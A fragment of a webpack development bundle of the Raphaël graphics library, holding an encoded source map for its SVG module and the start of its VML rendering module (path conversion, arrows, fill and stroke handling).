ID0gdGhpcy5fbGVmdCArIFwicHhcIjtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGlmICh0b3ApIHtcbiAgICAgICAgICAgICAgICB0aGlzLl90b3AgPSAodGhpcy5fdG9wICsgdG9wKSAlIDE7XG4gICAgICAgICAgICAgICAgcy50b3AgPSB0aGlzLl90b3AgKyBcInB4XCI7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBQYXBlci5jbGVhclxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogQ2xlYXJzIHRoZSBwYXBlciwgaS5lLiByZW1vdmVzIGFsbCB0aGUgZWxlbWVudHMuXG4gICAgXFwqL1xuICAgIFIucHJvdG90eXBlLmNsZWFyID0gZnVuY3Rpb24gKCkge1xuICAgICAgICBSLmV2ZShcInJhcGhhZWwuY2xlYXJcIiwgdGhpcyk7XG4gICAgICAgIHZhciBjID0gdGhpcy5jYW52YXM7XG4gICAgICAgIHdoaWxlIChjLmZpcnN0Q2hpbGQpIHtcbiAgICAgICAgICAgIGMucmVtb3ZlQ2hpbGQoYy5maXJzdENoaWxkKTtcbiAgICAgICAgfVxuICAgICAgICB0aGlzLmJvdHRvbSA9IHRoaXMudG9wID0gbnVsbDtcbiAgICAgICAgKHRoaXMuZGVzYyA9ICQoXCJkZXNjXCIpKS5hcHBlbmRDaGlsZChSLl9nLmRvYy5jcmVhdGVUZXh0Tm9kZShcIkNyZWF0ZWQgd2l0aCBSYXBoYVxceGVibCBcIiArIFIudmVyc2lvbikpO1xuICAgICAgICBjLmFwcGVuZENoaWxkKHRoaXMuZGVzYyk7XG4gICAgICAgIGMuYXBwZW5kQ2hpbGQodGhpcy5kZWZzID0gJChcImRlZnNcIikpO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFBhcGVyLnJlbW92ZVxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogUmVtb3ZlcyB0aGUgcGFwZXIgZnJvbSB0aGUgRE9NLlxuICAgIFxcKi9cbiAgICBSLnByb3RvdHlwZS5yZW1vdmUgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIGV2ZShcInJhcGhhZWwucmVtb3ZlXCIsIHRoaXMpO1xuICAgICAgICB0aGlzLmNhbnZhcy5wYXJlbnROb2RlICYmIHRoaXMuY2FudmFzLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQodGhpcy5jYW52YXMpO1xuICAgICAgICBmb3IgKHZhciBpIGluIHRoaXMpIHtcbiAgICAgICAgICAgIHRoaXNbaV0gPSB0eXBlb2YgdGhpc1tpXSA9PSBcImZ1bmN0aW9uXCIgPyBSLl9yZW1vdmVkRmFjdG9yeShpKSA6IG51bGw7XG4gICAgICAgIH1cbiAgICB9O1xuICAgIHZhciBzZXRwcm90byA9IFIuc3Q7XG4gICAgZm9yICh2YXIgbWV0aG9kIGluIGVscHJvdG8pIGlmIChlbHByb3RvW2hhc10obWV0aG9kKSAmJiAhc2V0cHJvdG9baGFzXShtZXRob2QpKSB7XG4gICAgICAgIHNldHByb3RvW21ldGhvZF0gPSAoZnVuY3Rpb24gKG1ldGhvZG5hbWUpIHtcbiAgICAgICAgICAgIHJldHVybiBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgdmFyIGFyZyA9IGFyZ3VtZW50cztcbiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5mb3JFYWNoKGZ1bmN0aW9uIChlbCkge1xuICAgICAgICAgICAgICAgICAgICBlbFttZXRob2RuYW1lXS5hcHBseShlbCwgYXJnKTtcbiAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgIH07XG4gICAgICAgIH0pKG1ldGhvZCk7XG4gICAgfVxufSk7XG4iXSwibWFwcGluZ3MiOiJBQUFBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFBQTsiLCJzb3VyY2VSb290IjoiIn0=\n//# sourceURL=webpack-internal:///./dev/raphael.svg.js\n') }, "./dev/raphael.vml.js": function (module, exports, __webpack_require__) { eval('var __WEBPACK_AMD_DEFINE_ARRAY__, __WEBPACK_AMD_DEFINE_RESULT__;!(__WEBPACK_AMD_DEFINE_ARRAY__ = [__webpack_require__(/*! ./raphael.core */ "./dev/raphael.core.js")], __WEBPACK_AMD_DEFINE_RESULT__ = (function(R) {\n    if (R && !R.vml) {\n        return;\n    }\n\n    var has = "hasOwnProperty",\n        Str = String,\n        toFloat = parseFloat,\n        math = Math,\n        round = math.round,\n        mmax = math.max,\n        mmin = math.min,\n        abs = math.abs,\n        fillString = "fill",\n        separator = /[, ]+/,\n        eve = R.eve,\n        ms = " progid:DXImageTransform.Microsoft",\n        S = " ",\n        E = "",\n        map = {M: "m", L: "l", C: "c", Z: "x", m: "t", l: "r", c: "v", z: "x"},\n        bites = /([clmz]),?([^clmz]*)/gi,\n        blurregexp = / progid:\\S+Blur\\([^\\)]+\\)/g,\n        val = /-?[^,\\s-]+/g,\n        cssDot = "position:absolute;left:0;top:0;width:1px;height:1px;behavior:url(#default#VML)",\n        zoom = 21600,\n        pathTypes = {path: 1, rect: 1, image: 1},\n        ovalTypes = {circle: 1, ellipse: 1},\n        path2vml = function (path) {\n            var total =  /[ahqstv]/ig,\n                command = R._pathToAbsolute;\n            Str(path).match(total) && (command = R._path2curve);\n            total = /[clmz]/g;\n            if (command == R._pathToAbsolute && !Str(path).match(total)) {\n                var res = Str(path).replace(bites, function (all, command, args) {\n                    var vals = [],\n                        isMove = command.toLowerCase() == "m",\n                        res = map[command];\n                    args.replace(val, function (value) {\n                        if (isMove && vals.length == 2) {\n                            res += vals + map[command == "m" ? "l" : "L"];\n                            vals = [];\n                        }\n                        vals.push(round(value * zoom));\n                    });\n                    return res + vals;\n                });\n                return res;\n            }\n            var pa = command(path), p, r;\n            res = [];\n            for (var i = 0, ii = pa.length; i < ii; i++) {\n                p = pa[i];\n                r = pa[i][0].toLowerCase();\n                r == "z" && (r = "x");\n                for (var j = 1, jj = p.length; j < jj; j++) {\n                    r += round(p[j] * zoom) + (j != jj - 1 ? "," : E);\n                }\n                res.push(r);\n            }\n            return res.join(S);\n        },\n        compensation = function (deg, dx, dy) {\n            var m = R.matrix();\n            m.rotate(-deg, .5, .5);\n            return {\n                dx: m.x(dx, dy),\n                dy: m.y(dx, dy)\n            };\n        },\n        setCoords = function (p, sx, sy, dx, dy, deg) {\n            var _ = p._,\n                m = p.matrix,\n                fillpos = _.fillpos,\n                o = p.node,\n                s = o.style,\n                y = 1,\n                flip = "",\n                dxdy,\n                kx = zoom / sx,\n                ky = zoom / sy;\n            s.visibility = "hidden";\n            if (!sx || !sy) {\n                return;\n            }\n            o.coordsize = abs(kx) + S + abs(ky);\n            s.rotation = deg * (sx * sy < 0 ? -1 : 1);\n            if (deg) {\n                var c = compensation(deg, dx, dy);\n                dx = c.dx;\n                dy = c.dy;\n            }\n            sx < 0 && (flip += "x");\n            sy < 0 && (flip += " y") && (y = -1);\n            s.flip = flip;\n            o.coordorigin = (dx * -kx) + S + (dy * -ky);\n            if (fillpos || _.fillsize) {\n                var fill = o.getElementsByTagName(fillString);\n                fill = fill && fill[0];\n                o.removeChild(fill);\n                if (fillpos) {\n                    c = compensation(deg, m.x(fillpos[0], fillpos[1]), m.y(fillpos[0], fillpos[1]));\n                    fill.position = c.dx * y + S + c.dy * y;\n                }\n                if (_.fillsize) {\n                    fill.size = _.fillsize[0] * abs(sx) + S + _.fillsize[1] * abs(sy);\n                }\n                o.appendChild(fill);\n            }\n            s.visibility = "visible";\n        };\n    R.toString = function () {\n        return  "Your browser doesn\\u2019t support SVG. Falling down to VML.\\nYou are running Rapha\\xebl " + this.version;\n    };\n    var addArrow = function (o, value, isEnd) {\n        var values = Str(value).toLowerCase().split("-"),\n            se = isEnd ? "end" : "start",\n            i = values.length,\n            type = "classic",\n            w = "medium",\n            h = "medium";\n        while (i--) {\n            switch (values[i]) {\n                case "block":\n                case "classic":\n                case "oval":\n                case "diamond":\n                case "open":\n                case "none":\n                    type = values[i];\n                    break;\n                case "wide":\n                case "narrow": h = values[i]; break;\n                case "long":\n                case "short": w = values[i]; break;\n            }\n        }\n        var stroke = o.node.getElementsByTagName("stroke")[0];\n        stroke[se + "arrow"] = type;\n        stroke[se + "arrowlength"] = w;\n        stroke[se + "arrowwidth"] = h;\n    },\n    setFillAndStroke = function (o, params) {\n        // o.paper.canvas.style.display = "none";\n        o.attrs = o.attrs || {};\n        var node = o.node,\n            a = o.attrs,\n            s = node.style,\n            xy,\n            newpath = pathTypes[o.type] && (params.x != a.x || params.y != a.y || params.width != a.width || params.height != a.height || params.cx != a.cx || params.cy != a.cy || params.rx != a.rx || params.ry != a.ry || params.r != a.r),\n            isOval = ovalTypes[o.type] && (a.cx != params.cx || a.cy != params.cy || a.r != params.r || a.rx != params.rx || a.ry != params.ry),\n            res = o;\n\n\n        for (var par in params) if (params[has](par)) {\n            a[par] = params[par];\n        }\n        if (newpath) {\n            a.path = R._getPath[o.type](o);\n            o._.dirty = 1;\n        }\n        params.href && (node.href = params.href);\n        params.title && (node.title = params.title);\n        params.target && (node.target = params.target);\n        params.cursor && (s.cursor = params.cursor);\n        "blur" in params && o.blur(params.blur);\n        if (params.path && o.type == "path" || newpath) {\n            node.path = path2vml(~Str(a.path).toLowerCase().indexOf("r") ? R._pathToAbsolute(a.path) : a.path);\n            o._.dirty = 1;\n            if (o.type == "image") {\n                o._.fillpos = [a.x, a.y];\n                o._.fillsize = [a.width, a.height];\n                setCoords(o, 1, 1, 0, 0, 0);\n            }\n        }\n        "transform" in params && o.transform(params.transform);\n        if (isOval) {\n            var cx = +a.cx,\n                cy = +a.cy,\n                rx = +a.rx || +a.r || 0,\n                ry = +a.ry || +a.r || 0;\n            node.path = R.format("ar{0},{1},{2},{3},{4},{1},{4},{1}x", round((cx - rx) * zoom), round((cy - ry) * zoom), round((cx + rx) * zoom), round((cy + ry) * zoom), round(cx * zoom));\n            o._.dirty = 1;\n        